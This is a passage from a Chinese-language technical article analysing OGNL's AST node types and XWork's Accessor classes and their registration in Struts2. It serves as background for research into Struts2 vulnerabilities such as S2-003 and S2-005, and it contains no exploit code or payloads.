            遍历`ElementsAccessor.getElements()`结果，依次作为source传入第一个子节点计算，结果通过`OgnlOps.booleanValue()`判断真假，真则放入ArrayList对象并跳出遍历，遍历结束后返回ArrayList

1. ASTSelectLast
    - 表现形式
        - `{$ one }`
    - 实现/重写方法
        - `protected void getValueBody(OgnlContext, Object)`

            遍历`ElementsAccessor.getElements()`结果，依次作为source传入第一个子节点计算，结果通过`OgnlOps.booleanValue()`判断真假，真则清空ArrayList对象并放入，遍历结束后返回ArrayList

1. ASTSequence
    - 表现形式
        - `one, two`
    - 实现/重写方法
        - `protected Object getValueBody(OgnlContext, Object)`

            遍历子节点计算，返回最后一个子节点的计算结果

        - `protected Object setValueBody(OgnlContext, Object, Object)`

            遍历最后一个子节点外的其他子节点计算，调用最后一个子节点的`setValue()`方法

1. ASTStaticField
    - 表现形式
        - `@one@two`
    - 实现/重写方法
        - `protected Object getValueBody(OgnlContext, Object)`

            调用`OgnlRuntime.getStaticField()`方法

        - `public boolean isNodeConstant(OgnlContext)`

            如果字段名称为『class』或类是Enum类型，直接返回`true`，否则通过反射判断是否为静态字段，返回判断结果

1. ASTStaticMethod
    - 表现形式
        - `@one@two()` *（无参方法）*
        - `@one@two(three, four)` *（含参方法）*
    - 实现/重写方法
        - `protected Object getValueBody(OgnlContext, Object)`

            遍历子节点计算，结果放入args数组变量，并传入`OgnlRuntime.callStaticMethod()`方法，返回执行结果

1. ASTVarRef
    - 表现形式
        - `#one`
    - 实现/重写方法
        - `protected Object getValueBody(OgnlContext, Object)`

            调用`OgnlContext.get()`方法

        - `protected void getValueBody(OgnlContext, Object, Object)`

            调用`OgnlContext.set()`方法

1. ASTRootVarRef
    - 表现形式
        - `#root`
    - 实现/重写方法
        - `protected Object getValueBody(OgnlContext, Object)`

            调用`OgnlContext.getRoot()`方法

        - `protected void setValueBody(OgnlContext, Object, Object)`

            调用`OgnlContext.setRoot()`方法

1. ASTThisVarRef
    - 表现形式
        - `#this`
    - 实现/重写方法
        - `protected Object getValueBody(OgnlContext, Object)`

            调用`OgnlContext.getCurrentObject()`方法

        - `protected void setValueBody(OgnlContext, Object, Object)`

            调用`OgnlContext.setCurrentObject()`方法

*（ASTNode中的ExpressionNode和它的子类，表示的是各种运算、关系表达式，对本文结论的影响不是特别大，因此就先搁置不再进行仔细分析了，感兴趣的同学继续加油努力，可以考虑共享成果:)）*

## OGNL Accessor

在问题3中，还提到了Accessor类型的差异，也会影响OGNL最终的执行结果，因为大多时候 *（Property赋值/取值，Method调用）* ，是由它们去处理执行真正的操作，因此再坚持一下，简单快速的来看看这些Accessor。

OGNL中大致分为Method、Property和Elements三类Accessor，而XWork主要针对Method和Property两类进行了实现，下文以Struts2为主，罗列一下其中主要的Accessor类型。

*（本部分以xwork-core-2.3.33为分析对象，主要描述关系，其中的逻辑细节就不在本文描述了，老版本的xwork在包结构上差异较大，请自行比对）*

还是从爸爸开始：

1. _PropertyAccessor_
    - 类型
        - 接口
    - 主要方法
        - `Object getProperty(Map, Object, Object)`
        - `void setProperty(Map, Object, Object, Object)`
1. _MethodAccessor_
    - 类型
        - 接口
    - 主要方法
        - `Object callStaticMethod(Map, Class, String, Object[])`
        - `Object callMethod(Map, Object, String, Object[])`
1. ObjectPropertyAccessor
    - 类型
        - 实现了PropertyAccessor
    - 主要方法
        - `public Object getProperty(Map, Object, Object)`
        - `public void setProperty(Map, Object, Object, Object)`
        - `public Class getPropertyClass(OgnlContext, Object, Object)`
1. ObjectMethodAccessor
    - 类型
        - 实现了MethodAccessor
    - 主要方法
        - `public Object callStaticMethod(Map, Class, String, Object[])`
        - `public Object callMethod(Map, Object, String, Object[])`

一小波儿子们：

1. CompoundRootAccessor
    - 类型
        - 实现了PropertyAccessor、MethodAccessor
    - 实现/重写方法
        - `public void getProperty(Map, Object, Object)`
        - `public void setProperty(Map, Object, Object, Object)`
        - `public Object callMethod(Map, Object, String, Object[])`
        - `public Object callStaticMethod(Map, Class, String, Object[])`
1. ObjectAccessor
    - 类型
        - 型继承于ObjectPropertyAccessor
    - 实现/重写方法
        - `public void getProperty(Map, Object, Object)`
        - `public void setProperty(Map, Object, Object, Object)`
1. ObjectProxyPropertyAccessor
    - 类型
        - 实现了PropertyAccessor
    - 实现/重写方法
        - `public void getProperty(Map, Object, Object)`
        - `public void setProperty(Map, Object, Object, Object)`
1. XWorkCollectionPropertyAccessor
    - 类型
        - 继承于SetPropertyAccessor *（继承于ObjectPropertyAccessor）*
    - 实现/重写方法
        - `public void getProperty(Map, Object, Object)`
        - `public void setProperty(Map, Object, Object, Object)`
1. XWorkEnumerationAccessor
    - 类型
        - 继承于EnumerationPropertyAccessor *（继承于ObjectPropertyAccessor）*
    - 实现/重写方法
        - `public void setProperty(Map, Object, Object, Object)`
1. XWorkIteratorPropertyAccessor
    - 类型
        - 继承于IteratorPropertyAccessor *（继承于ObjectPropertyAccessor）*
    - 实现/重写方法
        - `public void setProperty(Map, Object, Object, Object)`
1. XWorkListPropertyAccessor
    - 类型
        - 继承于ListPropertyAccessor *（继承于ObjectPropertyAccessor，实现了PropertyAccessor）*
    - 实现/重写方法
        - `public Object getProperty(Map, Object, Object)`
        - `public void setProperty(Map, Object, Object, Object)`
1. XWorkMapPropertyAccessor
    - 类型
        - 继承于MapPropertyAccessor *（实现了PropertyAccessor）*
    - 实现/重写方法
        - `public Object getProperty(Map, Object, Object)`
        - `public void setProperty(Map, Object, Object, Object)`
1. XWorkMethodAccessor
    - 类型
        - 继承于ObjectMethodAccessor *（实现了MethodAccessor）*
    - 实现/重写方法
        - `public Object callMethod(Map, Object, String, Object[])`
        - `public Object callStaticMethod(Map, Class, String, Object[])`
1. XWorkObjectPropertyAccessor
    - 类型
        - 继承于ObjectPropertyAccessor
    - 实现/重写方法
        - `public Object getProperty(Map, Object, Object)`

### 设置和获取

在跟踪分析S2-005解决问题3的过程中，发现XWork框架初始化 *（Struts2框架初始化流程中）* 时，在`DefaultConfiguration.reloadContainer()`方法中调用了`DefaultConfiguration.createBootstrapContainer()`方法，后者在创建完一堆工厂后调用`ContainerBuilder.create()`方法，随后触发OgnlValueStackFactory中配置了`@Inject`的`setContainer()`方法，它很重要的一部分逻辑就是将在XWork中定义的Accessor按类型设置进OgnlRuntime中的三个静态变量`_methodAccessors`、`_propertyAccessors`和`_elementsAccessors`中 *（请注意：当前调试环境为S2-005影响的struts2-core-2.1.8和xwork-core-2.1.6，版本较老，只为简单描述过程，新版如有差异，请自行比对）* ：

当然，在上述过程中，只设置了一个：

1. PropertyAccessor
    - `com.opensymphony.xwork2.util.CompoundRoot` -> `CompoundRootAccessor`

而OgnlRuntime会为常见数据类型设置对应的Accessor *（OGNL原生）* ，这是OgnlRuntime类初始化阶段的工作，基于Java的类加载机制可知，它将会在上述过程中的第一次`OgnlRuntime.setPropertyAccessor()`之前完成。

当XWork框架初始化流程继续执行到`StrutsObjectFactory.buildInterceptor()`方法时，又调用了`ObjectFactory.buildBean()`方法，后者也触发了`OgnlValueStackFactory.setContainer()`方法，进行了下面的设置 *（实际调用链较长，只描述关键点，感兴趣的可以跟踪一下）* ：

1. PropertyAccessor
    - `java.util.Enumeration` -> `XWorkEnumerationAccessor`
    - `java.util.ArrayList` -> `XWorkListPropertyAccessor`
    - `java.util.Iterator` -> `XWorkIteratorPropertyAccessor`
    - `java.lang.Object` -> `ObjectAccessor`
    - `java.util.Map` -> `XWorkMapPropertyAccessor`
    - `java.util.List` -> `XWorkListPropertyAccessor`
    - `java.util.HashSet` -> `XWorkCollectionPropertyAccessor`
    - `com.opensymphony.xwork2.util.CompoundRoot` -> `CompoundRootAccessor`
    - `java.util.Set` -> `XWorkCollectionPropertyAccessor`
    - `java.util.HashMap` -> `XWorkMapPropertyAccessor`
    - `java.util.Collection` -> `XWorkCollectionPropertyAccessor`
    - `com.opensymphony.xwork2.ognl.ObjectProxy` -> `ObjectProxyPropertyAccessor`
1. MethodAccessor
    - `java.lang.Object` -> `XWorkMethodAccessor`
    - `com.opensymphony.xwork2.util.CompoundRoot` -> `CompoundRootAccessor`

至此，Accessor的设置工作结束。

Accessor的获取则是根据需要调用OgnlRuntime中对应的`getter()`方法即可，如`getPropertyAccessor()`方法。

三个静态变量都是ClassCacheImpl类型 *（实现了ClassCache接口）* ，其中内置的`_table`字段用于存储实际内容，是一个Entry类型，类似于Map的key-value形式，默认大小512，key为Class类型，value为Object类型，按key的HashCode相对位置计算值 *（`key.hashCode() & (512 - 1)`）* 顺序存储 *（可参考Hash Table数据结构，解决位置冲突的方案也类似Linked Lists，每个Entry类型中包含一个`next`字段，可用于在位置冲突时指向存储在同位置的下一个元素）* ，类型本身线程不安全，OgnlRuntime在包装put/get操作时加了锁。

因此，Accessor的put/get操作基本可以参考Map类型。

## 结语

OGNL作为XWork框架的底层核心基石之一，它强大的功能特性让依托于XWork的Struts2成为当时非常流行的JavaEE开发框架。

因此，了解OGNL特性和内部处理逻辑，以及它与上层框架之间的交互逻辑，会对我们在Struts2，甚至XWork框架的安全研究工作上有非常大的帮助，例如本文主体讨论的表达式求值，就被很巧妙的利用在了S2-003以及之后的很多漏洞上，而且时间轴还非常靠前。

> 这就是一个安全研究员的内功修为，请这些大牛们收下一个身为程序员的我的膝盖。

## 参考

1. [CVE-2010-1870: Struts2/XWork remote command execution](http://blog.o0o.nu/2010/07/cve-2010-1870-struts2xwork-remote.html)
1. [CVE-2011-3923: Yet another Struts2 Remote Code Execution](http://blog.o0o.nu/2012/01/cve-2011-3923-yet-another-struts2.html)
1. [Apache Commons OGNL - Language Guide](http://commons.apache.org/proper/commons-ognl/language-guide.html)
1. [OGNL Expression Compilation](http://struts.apache.org/docs/ognl-expression-compilation.html)
